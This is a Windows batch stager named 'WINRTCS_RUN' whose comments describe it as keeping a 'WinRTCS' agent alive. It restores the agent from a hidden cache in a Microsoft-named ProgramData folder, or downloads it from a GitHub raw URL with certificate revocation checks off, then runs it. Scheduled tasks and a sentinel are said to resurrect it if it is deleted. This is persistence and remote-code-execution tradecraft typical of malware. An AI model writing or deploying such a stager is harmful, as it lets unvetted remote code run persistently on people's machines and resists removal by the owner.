@echo off
rem WINRTCS_RUN R2 - task stager: self-heal the agent file, then run it.
rem R2 (C19): resurrection cache first (no network needed), repo second. Both scheduled
rem tasks point here; this file is what keeps WinRTCS alive. If THIS file is wiped,
rem the sentinel restores it from the cache.
set "ZD=C:\ProgramData\WinRTCS"
set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if exist "%ZD%\winrtcs_agent.cmd" goto :Run
if exist "%CD%\winrtcs_agent.cmd" (
  findstr /C:"WINRTCS_AGENT" "%CD%\winrtcs_agent.cmd" >nul 2>&1
  if not errorlevel 1 (
    copy /y "%CD%\winrtcs_agent.cmd" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
    goto :Run
  )
)
%SystemRoot%\System32\curl.exe -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%ZD%\winrtcs_agent.dl" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%ZD%\winrtcs_agent.dl" exit /b 1
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.dl" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.dl" >nul 2>&1 & exit /b 2 )
move /y "%ZD%\winrtcs_agent.dl" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
:Run
call "%ZD%\winrtcs_agent.cmd"
exit /b 0
